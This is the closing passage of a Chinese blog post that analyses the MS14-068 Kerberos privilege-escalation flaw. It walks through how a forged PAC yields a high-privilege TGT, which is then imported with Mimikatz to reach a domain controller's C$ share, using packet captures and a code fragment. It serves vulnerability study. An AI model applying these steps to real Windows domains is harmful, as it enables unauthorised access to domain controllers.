<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-20.png">
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-21.png">
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-22.png">
<p>通过抓包可以看到在这个过程中将接收的TGT（268fdb开头）和加密方式为ARCFOUR-HMAC-MD5的PAC内容:</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-11.png">

<h4 id="KRB-TGS-REP"><a href="#KRB-TGS-REP" class="headerlink" title="KRB_TGS_REP"></a><strong>KRB_TGS_REP</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt_b = tgs_rep[<span class="string">'ticket'</span>]</span><br></pre></td></tr></table></figure>

<p>AS(KDC)在对伪造的PAC验证成功之后，返回给Client端一有新的TGT，并且这个TGT会将EXP生成的PAC包含在其中，这里正常情况下返回的其实是一张用于发送给Server端做认证的ST票据。<br>当Exp接收到新的TGT之后就将其保存生成ccache文件。也就是说这时Client已经获得了一张包含有高权限PAC内容的正常的TGT票据（564eab开头）：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-12.png">

<h4 id="使用Mimikatz利用TGT访问DC共享文件夹"><a href="#使用Mimikatz利用TGT访问DC共享文件夹" class="headerlink" title="使用Mimikatz利用TGT访问DC共享文件夹"></a><strong>使用Mimikatz利用TGT访问DC共享文件夹</strong></h4><p>通过mimikatz来导入上面得到的TGG票据，并且用dir \dc.yunying.lab\c$来访问域控的共享文件夹：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-23.png">
<p>抓包可以看到这时Client端发起了两次TGS-REQ请求，重点关注一下第一次，此时用的票据就是使用mimikatz导入的TGT，也就是上面KRB_TGS_REP过程中返回的那个tgt_b（564eab开头）：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-13.png">
<p>请求之后返回了一张针对dc.yunying.lab（域控）的CIFS票据也就是正常流程中的ST（Service Ticket）票据（234062开头）：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-14.png">
<p>这时在抓的包中发现并没有AP_REQ这个流程，是因为在Kerberos中AP_REQ这个过程放在了服务的第一次请求中，这里是放在SMB的Session Setup Request中（其他协议同理，比如HTTP协议是放在GET请求中）：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-15.png">
<p>然后在SMB的Session Setup Response中做出响应，也就是AP-REP这个流程：</p>
<img src="/2019/08/05/结合ms14068对kerberos协议分析/4-16.png">

<p>上述流程完成，Client就能够越权访问域控的共享文件夹了。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Windows/" rel="tag"># Windows</a>
          
            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
          
            <a href="/tags/协议分析/" rel="tag"># 协议分析</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/" rel="prev" title="结合CVE-2019-1040分析NTLM中继攻击">
                结合CVE-2019-1040分析NTLM中继攻击 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">LAHONJA</p>
              <p class="site-description motion-element" itemprop="description">网络安全 CTF 内网渗透 取证分析</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos协议介绍"><span class="nav-number">1.</span> <span class="nav-text">Kerberos协议介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SSPI"><span class="nav-number">1.1.</span> <span class="nav-text">什么是SSPI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows常用的SSP"><span class="nav-number">1.2.</span> <span class="nav-text">Windows常用的SSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos形象化理解"><span class="nav-number">1.3.</span> <span class="nav-text">Kerberos形象化理解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos协议具体介绍"><span class="nav-number">1.4.</span> <span class="nav-text">Kerberos协议具体介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos拓展阅读"><span class="nav-number">1.5.</span> <span class="nav-text">Kerberos拓展阅读</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#黄金票据"><span class="nav-number">2.</span> <span class="nav-text">黄金票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是TGT票据"><span class="nav-number">2.1.</span> <span class="nav-text">什么是TGT票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金票据原理"><span class="nav-number">2.2.</span> <span class="nav-text">黄金票据原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金票据利用条件"><span class="nav-number">2.3.</span> <span class="nav-text">黄金票据利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金票据利用过程"><span class="nav-number">2.4.</span> <span class="nav-text">黄金票据利用过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#白银票据"><span class="nav-number">3.</span> <span class="nav-text">白银票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#白银票据原理"><span class="nav-number">3.1.</span> <span class="nav-text">白银票据原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白银票据的特点"><span class="nav-number">3.2.</span> <span class="nav-text">白银票据的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白银票据利用条件"><span class="nav-number">3.3.</span> <span class="nav-text">白银票据利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白银票据的对应的服务列表"><span class="nav-number">3.4.</span> <span class="nav-text">白银票据的对应的服务列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#白银票据利用过程"><span class="nav-number">3.5.</span> <span class="nav-text">白银票据利用过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms14068漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">ms14068漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是PAC"><span class="nav-number">4.1.</span> <span class="nav-text">什么是PAC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP源码"><span class="nav-number">4.4.</span> <span class="nav-text">EXP源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用过程分析"><span class="nav-number">4.5.</span> <span class="nav-text">漏洞利用过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KRB-AS-REQ"><span class="nav-number">4.5.1.</span> <span class="nav-text">KRB_AS_REQ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#KRB-AS-REP"><span class="nav-number">4.5.2.</span> <span class="nav-text">KRB_AS_REP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#KRB-TGS-REQ"><span class="nav-number">4.5.3.</span> <span class="nav-text">KRB_TGS_REQ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#build-pac"><span class="nav-number">4.5.3.1.</span> <span class="nav-text">build_pac</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#build-tgs-req"><span class="nav-number">4.5.3.2.</span> <span class="nav-text">build_tgs_req</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#KRB-TGS-REP"><span class="nav-number">4.5.4.</span> <span class="nav-text">KRB_TGS_REP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用Mimikatz利用TGT访问DC共享文件夹"><span class="nav-number">4.5.5.</span> <span class="nav-text">使用Mimikatz利用TGT访问DC共享文件夹</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LAHONJA</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
